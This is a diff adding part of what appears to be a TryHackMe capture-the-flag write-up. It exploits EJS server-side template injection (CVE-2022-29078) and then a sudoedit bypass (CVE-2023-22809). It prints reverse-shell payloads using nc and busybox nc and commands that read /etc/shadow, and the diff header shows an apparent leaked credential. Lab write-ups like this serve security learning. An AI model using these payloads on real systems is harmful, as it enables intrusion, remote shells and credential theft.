@@ -85,9 +85,121 @@ Gayle Bev:p~]P@5!6;rs558:q
 
 
 
+###  in endpoint of settings 
 
 
 
+<img width="1550" height="526" alt="image" src="https://github.com/user-attachments/assets/9a7ba6a7-c4d5-4f8d-bcde-73a73a4d600d" />
+
+
+
+### found that password reflacted in page 
+
+
+<img width="1418" height="515" alt="image" src="https://github.com/user-attachments/assets/b9312f7d-d151-4a23-8755-280c82a6467c" />
+
+
+> #### try xss but not work
+
+
+### when remove **`&password=a`**
+
+
+
+<img width="1572" height="743" alt="image" src="https://github.com/user-attachments/assets/41335361-9737-402b-97ad-a0bea37acaef" />
+
+
+<img width="756" height="409" alt="image" src="https://github.com/user-attachments/assets/b0c51d15-70d4-4d18-99d8-5a1c7158bc57" />
+
+> ## found that it work with **`EJS`** THIS is popular javascript template engine  
+
+### search on **`ejs ssti`** i found 
+
+[EJS, Server side template injection ejs@3.1.9 Latest](https://github.com/mde/ejs/issues/720)
+
+
+<img width="1207" height="417" alt="image" src="https://github.com/user-attachments/assets/ae6d4bce-9306-42e4-87d2-6eac9782d0cd" />
+
+[EJS, Server side template injection RCE (CVE-2022-29078)](https://eslam.io/posts/ejs-server-side-template-injection-rce/)
+
+
+<img width="1175" height="395" alt="image" src="https://github.com/user-attachments/assets/9a268b36-6321-4880-85f6-3e1a3836aaad" />
+
+
+### search on **`CVE-2022-29078`**  
+
+
+### [Snyk Vulnerability Database](https://security.snyk.io/vuln/SNYK-JS-EJS-2803307)
+
+
+<img width="1262" height="472" alt="image" src="https://github.com/user-attachments/assets/c15141ec-b52f-4fda-8c0b-504910c184fc" />
+
+
+
+```
+&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s
+```
+
+---
+
+```
+name=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 192.168.168.188 4444 -e bash');s
+```
+
+
+
+
+<img width="1528" height="715" alt="image" src="https://github.com/user-attachments/assets/83d3b89e-0745-446c-bdcc-591ee0836edc" />
+
+
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+<img width="625" height="206" alt="image" src="https://github.com/user-attachments/assets/73c78afa-dff8-4a8d-a9fc-c5c13cb1548a" />
+
+
+```
+THM{4lways_upd4te_uR_d3p3nd3nc!3s}
+```
+
+
+## privesc
+
+
+```
+sudo -l 
+```
+
+
+<img width="932" height="206" alt="image" src="https://github.com/user-attachments/assets/9c9aa2cb-f3ce-40f5-8c91-d3c2f6757f0d" />
+
+[CVE-2023-22809: Sudoedit Bypass](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis)
+
+
+```
+export EDITOR="vi -- /etc/shadow"
+sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+```
+
+
+
+```
+export EDITOR="vi -- /root/root.txt"
+sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+```
+
+
+<img width="1064" height="449" alt="image" src="https://github.com/user-attachments/assets/64ea704e-608d-4505-be1b-9263f4f09668" />
+
+
+
+
+
+```
+THM{4nd_uR_p4ck4g3s}
+```
 
 
 
